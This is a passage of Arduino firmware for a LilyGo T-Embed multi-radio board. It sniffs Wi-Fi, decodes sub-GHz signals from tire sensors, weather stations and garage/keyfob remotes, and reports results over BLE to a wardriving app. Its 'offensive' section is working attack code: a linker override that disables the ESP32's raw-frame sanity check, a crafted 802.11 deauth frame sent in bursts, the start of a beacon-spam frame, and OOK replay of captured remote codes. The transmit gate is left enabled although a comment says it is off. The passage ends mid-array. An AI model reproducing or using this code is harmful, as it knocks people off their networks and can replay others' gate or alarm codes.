// tembedbiscuit — LilyGo T-Embed CC1101 (Plus) as a Flying Flocks "Biscuit" board.
//
// A self-contained firmware IMAGE (not Marauder) that speaks the public Biscuit
// BLE/GATT protocol, so Flying Flocks connects to it like any fleet board and its
// results flow onto the wardrive map with no app changes. The same line protocol
// is mirrored over USB-CDC serial (DATA:/STATUS: out, CMD: in).
//
// Hardware exposed (LilyGo T-Embed CC1101 Plus, ESP32-S3 dual-core):
//   * CC1101 sub-GHz  -> DATA:RF / DATA:TPMS / DATA:WEATHER / DATA:KEYFOB, gated CMD:tx
//     (ported from the working G:\arduino-tools\sketches\c5biscuit\c5biscuit.ino,
//      re-pinned for this board + its RF band-select antenna switch)
//   * Wi-Fi (2.4 GHz) -> DATA:AP (scan) + DATA:STA / DATA:PROBE / DATA:PKT (promiscuous)
//     + offensive CMD:deauth / CMD:beaconspam (app-gated)
//   * PN532 NFC/RFID  -> DATA:NFC on CMD:nfcread
//   * IR TX/RX        -> CMD:irsend / DATA:IR
//   * ST7789 display  -> live connection/scan status + board-id line
//   * WS2812 LED + rotary encoder/buttons -> local status + DATA:BTN
//
// The ESP32-S3 is dual-core, so the BLE host runs on the other core and blocking
// is less punishing than on the single-core C5 — but scans still yield and bail on
// disconnect. Protocol/pins are documented in TEMBED_BISCUIT.md.

#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_system.h"   // esp_restart() for return-to-launcher
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <Wire.h>
#include <SPI.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <Adafruit_NeoPixel.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <Adafruit_PN532.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <IRrecv.h>
#include <IRutils.h>
#include <Preferences.h>
#include <SD.h>
#include <FS.h>
#include "crow_sprites.h"
#include <esp_sleep.h>
#include <driver/gpio.h>

// Declared up here (before the first function) so Arduino's auto-generated
// prototypes, which reference it, see the type.
enum FUScreen { S_BOOT, S_MAIN, S_SUB, S_NFC, S_IR, S_WIFI, S_BLE, S_NEST, S_COLL, S_FILE, S_SET, S_ABOUT, S_ACTION, S_CONFIRM };

// ---- Biscuit GATT contract (matches the app's BiscuitGatt, verified) --------
#define SVC_UUID  "4fafc201-1fb5-459e-8fcc-c5c9c331914b"
#define CMD_UUID  "beb5483e-36e1-4688-b7f5-ea07361b26a8"
#define RESP_UUID "beb5483e-36e1-4688-b7f5-ea07361b26a9"
#define STAT_UUID "beb5483e-36e1-4688-b7f5-ea07361b26aa"

#define DEV_NAME "Flocked Up"

// ---- T-Embed CC1101 pins (official repo examples/utilities.h) ---------------
#define PIN_SPI_SCK  11
#define PIN_SPI_MISO 10
#define PIN_SPI_MOSI 9
#define CC1101_CS    12
#define CC1101_GDO0  3      // BOARD_LORA_IO0
#define CC1101_GDO2  38     // BOARD_LORA_IO2
#define RF_SW1       47     // antenna band-select
#define RF_SW0       48
#define BOARD_PWR_EN 15     // MUST be HIGH or the board powers off

#define TFT_BL  21
#define TFT_CS  41
#define TFT_DC  16
#define TFT_RST -1

#define I2C_SDA 8
#define I2C_SCL 18
#define PN532_IRQ_PIN 17
#define PN532_RST_PIN 45

#define IR_TX_PIN 2
#define IR_RX_PIN 1

#define WS2812_PIN 14
#define WS2812_N   8
#define ENC_A   4
#define ENC_B   5
#define ENC_KEY 0
#define USER_KEY 6

// ---- sub-GHz config (same bands as c5biscuit) ------------------------------
const float SUBGHZ_FREQS[] = {315.00f, 433.92f, 868.00f, 915.00f};
const int   SUBGHZ_N = 4;
const int   RF_ACTIVITY_DBM = -92;
const float RF_DECODE_HZ[] = {433.92f, 315.00f};
const int   RF_DECODE_N = 2;

// Sub-GHz TRANSMIT gate — OFF unless compiled with ALLOW_TX 1. Replays a captured
// OOK burst (your OWN devices only; the app confirms ownership first).
#define ALLOW_TX 1
const uint32_t TX_SHORT_US = 500;
const uint32_t TX_LONG_US  = 1000;
const int      TX_REPEATS  = 4;

// ---- objects ---------------------------------------------------------------
Adafruit_ST7789  tft  = Adafruit_ST7789(&SPI, TFT_CS, TFT_DC, TFT_RST);
Adafruit_NeoPixel leds(WS2812_N, WS2812_PIN, NEO_GRB + NEO_KHZ800);
Adafruit_PN532   nfc(PN532_IRQ_PIN, PN532_RST_PIN, &Wire);
IRsend           irsend(IR_TX_PIN);
IRrecv           irrecv(IR_RX_PIN);

BLECharacteristic *respChar = nullptr;
BLECharacteristic *statChar = nullptr;
volatile bool connected = false;
volatile bool scanning  = false;     // generic DATA:AP wardrive sweep
volatile bool subScan   = false;     // sub-GHz sweep/decode active (CMD:scanall)
bool  cc1101ok = false;
bool  nfcok = false;
bool  irRxOn = false;
String op = "idle";

// ---- link-code pairing gate ------------------------------------------------
// At boot we show a random 6-digit code on the screen. A BLE central may connect
// and enable notifications, but until it sends CMD:link:<matching code> the device
// is LOCKED and ignores every other CMD. Linking is per BLE session (resets on
// disconnect); the code only changes on reboot or an encoder-button regenerate,
// so the app can persist it per device and auto-resend on reconnect.
uint32_t linkCode = 0;              // current 6-digit code (100000..999999)
bool     linked = false;           // this BLE session has linked
bool     linkNeedPending = false;  // owe the central a DATA:LINK:need
uint32_t linkNeedAt = 0;           // when to send it (grace for CCCD enable)
int      linkBadTries = 0;
uint32_t linkBackoffUntil = 0;

void genLinkCode() {
  linkCode = 100000 + (esp_random() % 900000);  // always 6 digits, no leading zero
}

// ---- return to bmorcelli's Launcher ----------------------------------------
// This image is loaded by bmorcelli/Launcher, which lives in the loader app slot
// and catches the Esc/back button (GPIO6 = USER_KEY, -DLAUNCHER_GPIO_KEYS {"Esc",6})
// held during a restart. So the way back is simply: reboot while GPIO6 is held.
// A long-press of USER_KEY does exactly that — because the user is still physically
// holding the button through the reboot, the Launcher sees it and stays in the menu
// instead of re-launching this app.
void returnToLauncher() {
  drawStatus("Returning to", "Launcher... hold Esc");
  setLed(0, 0, 0);
  delay(250);
  esp_restart();
}

// Sub-GHz TX request handed from BLE callback to loop().
volatile bool txPending = false;
float  txFreq = 433.92f;
String txBits = "";

bool serialActive = false;

// ===========================================================================
// FLOCKED UP — standalone crow UI state (menu, theme, mascot, SD, settings).
// A murder of crows. The Biscuit BLE bridge still runs underneath so the
// Flying Flocks app can connect; on-device the menu is always open.
// ===========================================================================
#define SD_CS 13

#define RGB565(r,g,b) ((uint16_t)((((r)&0xF8)<<8)|(((g)&0xFC)<<3)|((b)>>3)))
static const uint16_t C_BG     = RGB565(8,8,10);
static const uint16_t C_PANEL  = RGB565(18,18,24);
static const uint16_t C_INK    = RGB565(232,230,220);
static const uint16_t C_BLOOD  = RGB565(202,28,36);
static const uint16_t C_AMBER  = RGB565(242,172,42);
static const uint16_t C_DIM    = RGB565(112,112,124);
static const uint16_t C_CROW   = RGB565(22,22,28);
static const uint16_t C_CROWHI = RGB565(64,70,92);
static const uint16_t C_EYE    = RGB565(246,200,44);
static const uint16_t C_PLUM   = RGB565(178,75,255);   // #B24BFF — crow sprite colour

struct FUSettings {
  bool    puns    = true;
  uint8_t bright  = 40;     // LED brightness 20..100
  uint8_t led     = 0;      // palette index
  uint8_t mascot  = 0;      // default mood 0..3
  bool    appLink = true;   // BLE advertising on
  uint8_t rot     = 1;      // display rotation (1 normal, 3 flipped — both landscape)
  uint8_t sleepMin = 0;     // auto-sleep after N minutes idle (0 = off)
};
FUSettings cfg;
Preferences prefs;

const uint8_t LED_PAL[][3] = {{14,0,2},{0,12,2},{0,8,12},{10,0,12},{14,8,0},{12,12,12}};
const char*   LED_NAME[]   = {"Blood","Green","Cyan","Purple","Amber","White"};
const int     LED_PAL_N    = 6;

bool sdok = false;

// on-screen result log (fed by notifyLine while a local action runs)
#define FU_LOGN 8
String  fuLog[FU_LOGN];
int     fuLogN = 0;
bool    uiActionActive = false;    // an on-device action screen is running a job
volatile bool localActive = false; // a local job wants the radios to run (no host)
bool    nfcPolling = false;
volatile bool bleScanRun = false;
volatile bool anaRun = false;        // frequency-analyzer sweep active
BLEScan *pBLEScan = nullptr;

FUScreen fuScr = S_BOOT;
FUScreen fuActionParent = S_MAIN;
int      fuSel = 0;
bool     fuDirty = true;
uint8_t  fuMood = 0;               // 0 idle, 1 scan, 2 hit, 3 flip
int      fuPendingAction = -1;
String   fuActionTitle = "";
String   fuFilePath = "";
bool     fuFull = true;             // true = full redraw (chrome+crow); false = rows only
bool     fuRowsDirty = false;       // selection moved: redraw just the list rows (fast)
uint32_t fuLastInput = 0;           // for the auto-sleep timeout
#define  SETTINGS_N 10
const uint32_t SLEEP_OPTS[] = {0, 1, 2, 5, 10};
const int      SLEEP_OPTS_N = 5;

const char* MAIN_PLAIN[] = {"Sub-GHz","NFC / RFID","Infrared","Wi-Fi Recon","Bluetooth","SD Files","Collections","Settings","About"};
const char* MAIN_PUN[]   = {"Caw-GHz","Peck","Flock Beam","Murder Scan","Scavenge","The Nest","Hoard","Roost","The Murder"};
const FUScreen MAIN_GOTO[] = {S_SUB,S_NFC,S_IR,S_WIFI,S_BLE,S_NEST,S_COLL,S_SET,S_ABOUT};
const int   MAIN_N = 9;
#define COLL_ROOT "/flockedup/collections"
String nestFloor = "/";   // the root this Nest session is anchored to (back stops here)
const char* SUB_ITEMS[]  = {"Scan & Decode","RSSI Sweep","Analyzer"};
const int   SUB_N = 3;
const char* WIFI_ITEMS[] = {"AP Scan","Stations","Probes","Pkt Monitor","Deauth","Beacon Spam"};
const int   WIFI_N = 6;

// SD browser state
String  nestPath = "/";
#define NEST_MAX 96
String  nestNames[NEST_MAX];
bool    nestIsDir[NEST_MAX];
int     nestN = 0, nestSel = 0, nestTop = 0;

bool hostUp() { return connected || serialActive || localActive; }

void fuPushLog(const String &s) {
  String t = s; t.trim();
  if (!t.length()) return;
  for (int i = FU_LOGN - 1; i > 0; i--) fuLog[i] = fuLog[i - 1];
  fuLog[0] = t;
  if (fuLogN < FU_LOGN) fuLogN++;
  if (uiActionActive) fuDirty = true;
}

// Promiscuous sniffer -> loop() drain queue (BLE must not be touched in the cb).
static const int SNQ = 48;
struct SnRec { char line[72]; };
volatile SnRec   snq[SNQ];
volatile uint16_t snHead = 0, snTail = 0;
portMUX_TYPE snMux = portMUX_INITIALIZER_UNLOCKED;
volatile uint32_t pktBeacons = 0, pktDeauths = 0, pktProbes = 0, pktData = 0;
uint8_t  snifferMode = 0;            // 0 off, 'S' station, 'P' probe, 'M' pktmon
volatile bool deauthRun = false, beaconRun = false;
uint8_t  deauthTarget[6] = {0};
bool     haveDeauthTarget = false;

// GDO0 edge-capture ring buffer (sub-GHz raw decode window only).
static const int CAP_MAX = 1024;
volatile uint32_t capBuf[CAP_MAX];
volatile uint16_t capHead = 0;
uint16_t          capTail = 0;
portMUX_TYPE capMux = portMUX_INITIALIZER_UNLOCKED;

void IRAM_ATTR gdo0Isr() {
  uint32_t t = micros();
  portENTER_CRITICAL_ISR(&capMux);
  uint16_t next = (capHead + 1) % CAP_MAX;
  if (next != capTail) { capBuf[capHead] = t; capHead = next; }
  portEXIT_CRITICAL_ISR(&capMux);
}

// ===========================================================================
// Output
// ===========================================================================
void notifyLine(const String &line) {
  Serial.print(line);
  if (respChar && connected) {
    respChar->setValue((uint8_t *)line.c_str(), line.length());
    respChar->notify();
    delay(6);
  }
  if (uiActionActive) fuPushLog(line);
}

void setStatus(const char *o) {
  op = o;
  if (statChar) {
    String j = "{\"status\":0,\"battery\":100,\"op\":\"";
    j += o; j += "\",\"heap\":"; j += String(ESP.getFreeHeap());
    j += ",\"model\":\"LilyGo T-Embed CC1101 Plus\",\"name\":\"" DEV_NAME "\",\"link\":\"";
    j += (linked ? "ok" : "required");
    j += "\"}";
    statChar->setValue((uint8_t *)j.c_str(), j.length());
  }
}

const char *authStr(wifi_auth_mode_t a) {
  switch (a) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA3";
    default: return "WPA2";
  }
}

String hex2(const uint8_t *b, int n) {
  String s; char t[3];
  for (int i = 0; i < n; i++) { sprintf(t, "%02X", b[i]); s += t; }
  return s;
}

// ===========================================================================
// Display (status only; the app is the real UI)
// ===========================================================================
void drawStatus(const String &l1, const String &l2) {
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextColor(ST77XX_WHITE);
  tft.setTextSize(2);
  tft.setCursor(6, 8);   tft.print("Biscuit T-Embed");
  tft.setTextSize(1);
  tft.setCursor(6, 36);  tft.setTextColor(ST77XX_CYAN);  tft.print(l1);
  tft.setCursor(6, 52);  tft.setTextColor(ST77XX_GREEN); tft.print(l2);
  // Link code: big and clear while unlinked; "LINKED" once paired.
  if (!linked) {
    tft.setCursor(6, 84);  tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
    tft.print("LINK CODE");
    tft.setCursor(6, 100); tft.setTextSize(3); tft.setTextColor(ST77XX_WHITE);
    char cc[8]; sprintf(cc, "%06u", linkCode); tft.print(cc);
  } else {
    tft.setCursor(6, 92);  tft.setTextSize(3); tft.setTextColor(ST77XX_GREEN);
    tft.print("LINKED");
  }
  tft.setTextSize(1);
  tft.setCursor(6, 150); tft.setTextColor(tft.color565(120, 120, 120));
  tft.print("svc 4fafc201  "); tft.print(DEV_NAME);
}

void setLed(uint8_t r, uint8_t g, uint8_t b) {
  for (int i = 0; i < WS2812_N; i++) leds.setPixelColor(i, leds.Color(r, g, b));
  leds.show();
}

// ===========================================================================
// CC1101 sub-GHz (ported from c5biscuit.ino, re-pinned + band switch)
// ===========================================================================
// The T-Embed routes the CC1101 through an antenna band-select switch; set it to
// match the tuned frequency or the radio hears nothing.
void setRfBand(float mhz) {
  if (mhz < 350)        { digitalWrite(RF_SW1, HIGH); digitalWrite(RF_SW0, LOW);  } // 315
  else if (mhz < 600)   { digitalWrite(RF_SW1, HIGH); digitalWrite(RF_SW0, HIGH); } // 434
  else                  { digitalWrite(RF_SW1, LOW);  digitalWrite(RF_SW0, HIGH); } // 868/915
}

bool initCC1101() {
  ELECHOUSE_cc1101.setSpiPin(PIN_SPI_SCK, PIN_SPI_MISO, PIN_SPI_MOSI, CC1101_CS);
  ELECHOUSE_cc1101.setGDO0(CC1101_GDO0);
  ELECHOUSE_cc1101.Init();
  if (!ELECHOUSE_cc1101.getCC1101()) return false;
  setRfBand(433.92f);
  ELECHOUSE_cc1101.setMHZ(433.92);
  ELECHOUSE_cc1101.SetRx();
  return true;
}

// LED signal meter: map RSSI onto the 8 NeoPixels (green -> red, more lit = stronger).
void ledSignal(int rssi) {
  int lvl = map(constrain(rssi, -100, -40), -100, -40, 0, WS2812_N);
  for (int i = 0; i < WS2812_N; i++) {
    uint32_t c = 0;
    if (i < lvl) c = leds.Color(map(i, 0, WS2812_N - 1, 0, 14), map(i, 0, WS2812_N - 1, 14, 0), 0);
    leds.setPixelColor(i, c);
  }
  leds.show();
}

void subghzRssiSweep() {
  if (!cc1101ok) { cc1101ok = initCC1101(); if (!cc1101ok) return; }
  ELECHOUSE_cc1101.setCCMode(1);
  ELECHOUSE_cc1101.setModulation(0);
  int peak = -128;
  for (int i = 0; i < SUBGHZ_N; i++) {
    setRfBand(SUBGHZ_FREQS[i]);
    ELECHOUSE_cc1101.setMHZ(SUBGHZ_FREQS[i]);
    ELECHOUSE_cc1101.SetRx();
    delay(60);
    int rssi = ELECHOUSE_cc1101.getRssi();
    if (rssi > peak) peak = rssi;
    if (rssi > RF_ACTIVITY_DBM)
      notifyLine("DATA:RF:" + String(SUBGHZ_FREQS[i], 2) + "," + String(rssi) + "\n");
  }
  ledSignal(peak);
}

// Frequency Analyzer: coarse-sweep the CC1101 bands and report the strongest frequency.
void freqAnalyzer() {
  if (!cc1101ok) { cc1101ok = initCC1101(); if (!cc1101ok) return; }
  ELECHOUSE_cc1101.setCCMode(1);
  ELECHOUSE_cc1101.setModulation(0);
  static const float A0[3] = {300, 387, 779};
  static const float A1[3] = {348, 464, 928};
  float bestF = 0; int bestR = -128;
  for (int b = 0; b < 3 && anaRun; b++) {
    for (float f = A0[b]; f <= A1[b] && anaRun; f += 1.0f) {
      setRfBand(f); ELECHOUSE_cc1101.setMHZ(f); ELECHOUSE_cc1101.SetRx();
      delayMicroseconds(1200);
      int r = ELECHOUSE_cc1101.getRssi();
      if (r > bestR) { bestR = r; bestF = f; }
    }
  }
  if (!anaRun) return;
  ledSignal(bestR);
  notifyLine("peak " + String(bestF, 2) + " MHz  " + String(bestR) + " dBm\n");
  setRfBand(bestF); ELECHOUSE_cc1101.setMHZ(bestF); ELECHOUSE_cc1101.SetRx();  // park on the peak
}

static const uint32_t GAP_US = 5000;

void applyRadioRaw(float mhz, bool ook) {
  setRfBand(mhz);
  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setModulation(ook ? 2 : 0);
  ELECHOUSE_cc1101.setMHZ(mhz);
  if (ook) { ELECHOUSE_cc1101.setDRate(5); ELECHOUSE_cc1101.setRxBW(203); }
  else { ELECHOUSE_cc1101.setDeviation(38); ELECHOUSE_cc1101.setDRate(19.2); ELECHOUSE_cc1101.setRxBW(203); }
  ELECHOUSE_cc1101.SetRx();
}

int drainBurst(uint16_t *out, int maxOut) {
  uint16_t head, tail;
  portENTER_CRITICAL(&capMux); head = capHead; tail = capTail; portEXIT_CRITICAL(&capMux);
  if (head == tail) return 0;
  uint32_t lastT; uint16_t prev = (head + CAP_MAX - 1) % CAP_MAX;
  portENTER_CRITICAL(&capMux); lastT = capBuf[prev]; portEXIT_CRITICAL(&capMux);
  if ((micros() - lastT) < GAP_US) return 0;
  int n = 0; uint32_t prevT = 0; bool first = true;
  while (tail != head && n < maxOut) {
    uint32_t t; portENTER_CRITICAL(&capMux); t = capBuf[tail]; tail = (tail + 1) % CAP_MAX; portEXIT_CRITICAL(&capMux);
    if (!first) { uint32_t d = t - prevT; out[n++] = (d > 65535) ? 65535 : (uint16_t)d; }
    prevT = t; first = false;
  }
  portENTER_CRITICAL(&capMux); capTail = tail; portEXIT_CRITICAL(&capMux);
  return n;
}

int manchester(const uint16_t *iv, int n, uint32_t bitUs, uint8_t *bytes, int maxBytes) {
  static uint8_t half[2048];
  int hn = 0, level = 0;
  for (int i = 0; i < n && hn < 2046; i++) {
    int reps = (iv[i] > (bitUs + bitUs / 2)) ? 2 : 1;
    for (int r = 0; r < reps && hn < 2046; r++) half[hn++] = level;
    level ^= 1;
  }
  int outBits = 0; uint8_t b = 0;
  for (int i = 0; i + 1 < hn; i += 2) {
    int a = half[i], c = half[i + 1];
    if (a == c) return 0;
    b = (b << 1) | ((a == 1 && c == 0) ? 1 : 0);
    if (++outBits % 8 == 0) { if (outBits / 8 <= maxBytes) bytes[outBits / 8 - 1] = b; b = 0; }
  }
  return outBits / 8;
}

void emitTpms(float mhz, const uint8_t *b, int n) {
  if (n < 7) return;
  String id = hex2(b, 4);
  float kpa = b[5] * 2.5f;
  int tempC = b[6] - 50;
  notifyLine("DATA:TPMS:" + String(mhz, 2) + "," + id + "," +
             String(kpa, 0) + "," + String(tempC) + "," + hex2(b, n) + "\n");
}

bool decodeNexus(const uint16_t *iv, int n, uint8_t &id, int &tempC10, int &hum, int &chan, int &batt) {
  uint8_t bits[40]; int nb = 0;
  for (int i = 0; i < n; i++) {
    uint16_t d = iv[i];
    if (d > 3800) { nb = 0; continue; }
    if (d < 750) continue;
    if (nb < 40) bits[nb++] = (d > 1500) ? 1 : 0;
    if (nb == 36) break;
  }
  if (nb < 36) return false;
  int marker = (bits[24] << 3) | (bits[25] << 2) | (bits[26] << 1) | bits[27];
  if (marker != 0xF || bits[9] != 0) return false;
  id = 0; for (int i = 0; i < 8; i++) id = (id << 1) | bits[i];
  batt = bits[8];
  chan = (bits[10] << 1) | bits[11];
  int t = 0; for (int i = 12; i < 24; i++) t = (t << 1) | bits[i];
  if (t & 0x800) t -= 0x1000;
  tempC10 = t;
  hum = 0; for (int i = 28; i < 36; i++) hum = (hum << 1) | bits[i];
  if (hum < 1 || hum > 100) return false;
  if (tempC10 < -400 || tempC10 > 700) return false;
  return true;
}

bool emitWeather(float mhz, const uint16_t *iv, int n) {
  uint8_t id; int t10, hum, ch, batt;
  if (!decodeNexus(iv, n, id, t10, hum, ch, batt)) return false;
  char ids[8]; sprintf(ids, "%02X%d", id, ch);
  notifyLine("DATA:WEATHER:" + String(mhz, 2) + "," + String(ids) + "," +
             String(t10 / 10.0f, 1) + "," + String(hum) + "\n");
  return true;
}

// PT2262 / EV1527 / tribit OOK remotes (garage, gate, alarm, cheap keyfobs).
// Estimates the base time element (te), finds the long sync gap, then reads
// tribit pairs: short+long = 0, long+short = 1. Returns the repeating code.
bool decodeOOK(const uint16_t *iv, int n, int &nbits, uint32_t &code) {
  if (n < 20) return false;
  uint16_t te = 0xFFFF;
  for (int i = 0; i < n; i++) if (iv[i] >= 120 && iv[i] < te) te = iv[i];
  if (te == 0xFFFF || te < 120 || te > 900) return false;
  int lo = te - te / 2,       hi = te + te / 2;        // ~1 te
  int lo3 = te * 3 - te,      hi3 = te * 3 + te;        // ~3 te
  int start = 0;
  for (int i = 0; i < n - 1; i++) if (iv[i] >= (int)te * 10) { start = i + 1; break; }
  uint32_t v = 0; int bits = 0;
  for (int i = start; i + 1 < n && bits < 28; i += 2) {
    int a = iv[i], b = iv[i + 1];
    if (a >= (int)te * 8 || b >= (int)te * 8) break;    // next sync
    bool aS = (a >= lo && a <= hi),  aL = (a >= lo3 && a <= hi3);
    bool bS = (b >= lo && b <= hi),  bL = (b >= lo3 && b <= hi3);
    int bit;
    if (aS && bL)      bit = 0;
    else if (aL && bS) bit = 1;
    else break;
    v = (v << 1) | bit; bits++;
  }
  if (bits >= 20 && bits <= 28) { nbits = bits; code = v; return true; }
  return false;
}

void processBurst(float mhz, bool ook, const uint16_t *iv, int n) {
  if (ook) {
    if (emitWeather(mhz, iv, n)) return;
    int nb; uint32_t code;
    if (decodeOOK(iv, n, nb, code)) {
      char hx[12]; sprintf(hx, "%06lX", (unsigned long)code);
      notifyLine("DATA:SUBGHZ:" + String(mhz, 2) + ",OOK," + String(nb) + "," + hx + "\n");
      return;
    }
    String bits;
    for (int i = 0; i < n && bits.length() < 96; i++) bits += (iv[i] > 500) ? '1' : '0';
    notifyLine("DATA:KEYFOB:" + String(mhz, 2) + "," + String(n) + "," + bits + "\n");
  } else {
    uint8_t bytes[32];
    int nb = manchester(iv, n, 52, bytes, sizeof(bytes));
    if (nb < 7) nb = manchester(iv, n, 26, bytes, sizeof(bytes));
    if (nb >= 7) emitTpms(mhz, bytes, nb < 20 ? nb : 20);
  }
}

void rfDecodeWindow() {
  if (!cc1101ok) return;
  static uint16_t iv[CAP_MAX];
  attachInterrupt(digitalPinToInterrupt(CC1101_GDO0), gdo0Isr, CHANGE);
  for (int band = 0; band < RF_DECODE_N; band++) {
    for (int mod = 0; mod < 2; mod++) {
      applyRadioRaw(RF_DECODE_HZ[band], mod == 1);
      portENTER_CRITICAL(&capMux); capHead = 0; capTail = 0; portEXIT_CRITICAL(&capMux);
      uint32_t t0 = millis();
      while (millis() - t0 < 400 && hostUp() && subScan) {
        int n = drainBurst(iv, CAP_MAX);
        if (n >= 16) processBurst(RF_DECODE_HZ[band], mod == 1, iv, n);
        delay(2);
      }
    }
  }
  detachInterrupt(digitalPinToInterrupt(CC1101_GDO0));
}

#if ALLOW_TX
void doTransmit(float mhz, const String &bits) {
  if (!cc1101ok) { cc1101ok = initCC1101(); if (!cc1101ok) return; }
  detachInterrupt(digitalPinToInterrupt(CC1101_GDO0));
  setRfBand(mhz);
  ELECHOUSE_cc1101.setCCMode(0);
  ELECHOUSE_cc1101.setModulation(2);
  ELECHOUSE_cc1101.setMHZ(mhz);
  ELECHOUSE_cc1101.SetTx();
  pinMode(CC1101_GDO0, OUTPUT);
  for (int rep = 0; rep < TX_REPEATS; rep++) {
    int level = 1;
    for (unsigned i = 0; i < bits.length(); i++) {
      digitalWrite(CC1101_GDO0, level);
      delayMicroseconds(bits[i] == '1' ? TX_LONG_US : TX_SHORT_US);
      level ^= 1;
    }
    digitalWrite(CC1101_GDO0, LOW);
    delay(8);
  }
  ELECHOUSE_cc1101.SetRx();
  pinMode(CC1101_GDO0, INPUT);
  notifyLine("DATA:TXDONE:" + String(mhz, 2) + "," + String(bits.length()) + "\n");
}
#endif

// ===========================================================================
// Wi-Fi recon — AP scan (DATA:AP) + promiscuous STA/PROBE/pktmon
// ===========================================================================
void wifiScanBroadcast() {
  WiFi.scanNetworks(/*async=*/true, /*show_hidden=*/true);
  uint32_t t0 = millis();
  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
    delay(30);
    if (!hostUp()) { WiFi.scanDelete(); return; }
    if (millis() - t0 > 15000) { WiFi.scanDelete(); return; }
  }
  int n = WiFi.scanComplete();
  if (n < 0) { WiFi.scanDelete(); return; }
  for (int i = 0; i < n; i++) {
    if (!hostUp()) break;
    String line = "DATA:AP:" + WiFi.SSID(i) + "," + WiFi.BSSIDstr(i) + "," +
                  String(WiFi.channel(i)) + "," + String(WiFi.RSSI(i)) + "," +
                  authStr(WiFi.encryptionType(i)) + "\n";
    notifyLine(line);
  }
  WiFi.scanDelete();
}

// Push a sniffer record to the loop() drain queue (ISR/WiFi-task context safe).
static void snPush(const char *s) {
  portENTER_CRITICAL(&snMux);
  uint16_t next = (snHead + 1) % SNQ;
  if (next != snTail) { strncpy((char *)snq[snHead].line, s, 71); snq[snHead].line[71] = 0; snHead = next; }
  portEXIT_CRITICAL(&snMux);
}

static void macTo(char *dst, const uint8_t *m) {
  sprintf(dst, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}

// Promiscuous RX: classify frames, count, and queue STA/PROBE records.
void promiscCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *fr = p->payload;
  int rssi = p->rx_ctrl.rssi;
  uint8_t fc = fr[0];
  uint8_t ftype = (fc >> 2) & 0x3;
  uint8_t fsub  = (fc >> 4) & 0xf;
  char line[72], amac[18], bmac[18];

  if (ftype == 0) {                         // management
    if (fsub == 8)  pktBeacons++;           // beacon
    else if (fsub == 12) pktDeauths++;      // deauth
    else if (fsub == 4) {                   // probe request
      pktProbes++;
      if (snifferMode == 'P' || snifferMode == 'M') {
        // SSID IE starts at tagged params (offset 24): id(0) len ssid...
        uint8_t ssidLen = fr[25];
        if (ssidLen > 0 && ssidLen <= 32) {
          char ss[33]; memcpy(ss, &fr[26], ssidLen); ss[ssidLen] = 0;
          snprintf(line, sizeof(line), "DATA:PROBE:%s,%d\n", ss, rssi);
          snPush(line);
        }
      }
    }
  } else if (ftype == 2) {                   // data
    pktData++;
    if (snifferMode == 'S' || snifferMode == 'M') {
      macTo(amac, &fr[10]);                  // addr2 = source (station)
      macTo(bmac, &fr[4]);                    // addr1 = dest (often the AP/BSSID)
      snprintf(line, sizeof(line), "DATA:STA:%s,%s,%d\n", amac, bmac, rssi);
      snPush(line);
    }
  }
}

void startSniffer(uint8_t mode) {
  snifferMode = mode;
  pktBeacons = pktDeauths = pktProbes = pktData = 0;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&promiscCb);
  esp_wifi_set_promiscuous(true);
}

void stopSniffer() {
  snifferMode = 0;
  esp_wifi_set_promiscuous(false);
}

// Drain queued sniffer records to BLE/serial (from loop(), where BLE is safe).
void drainSniffer() {
  for (int guard = 0; guard < 24; guard++) {
    char local[72];
    bool got = false;
    portENTER_CRITICAL(&snMux);
    if (snTail != snHead) { strncpy(local, (char *)snq[snTail].line, 72); snTail = (snTail + 1) % SNQ; got = true; }
    portEXIT_CRITICAL(&snMux);
    if (!got) break;
    notifyLine(String(local));
  }
}

// ---- offensive raw TX (app-gated like the C5 bridge) -----------------------
// The ESP32 Wi-Fi lib rejects crafted deauth frames via a sanity check; override
// the weak symbol so esp_wifi_80211_tx accepts them (needs the linker flag
// -Wl,--allow-multiple-definition, same as the Marauder build).
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }

uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // dest (broadcast by default)
  0x00,0x00,0x00,0x00,0x00,0x00,            // src (filled per target)
  0x00,0x00,0x00,0x00,0x00,0x00,            // bssid
  0x00, 0x00, 0x07, 0x00                    // seq + reason 7
};

void sendDeauthBurst() {
  if (haveDeauthTarget) {
    memcpy(&deauthFrame[10], deauthTarget, 6);
    memcpy(&deauthFrame[16], deauthTarget, 6);
  }
  for (int i = 0; i < 3; i++) esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

uint8_t beaconFrame[] = {
  0x80, 0x00, 0x00, 0x00, 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0xBA,0xDE,0xC0,0xFF,0xEE,0x00, 0xBA,0xDE,0xC0,0xFF,0xEE,0x00,
  0x00, 0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x64,0x00, 0x01,0x04,
  0x00, 0x06, 'B','i','s','c','1','0',      // SSID IE (len 6)
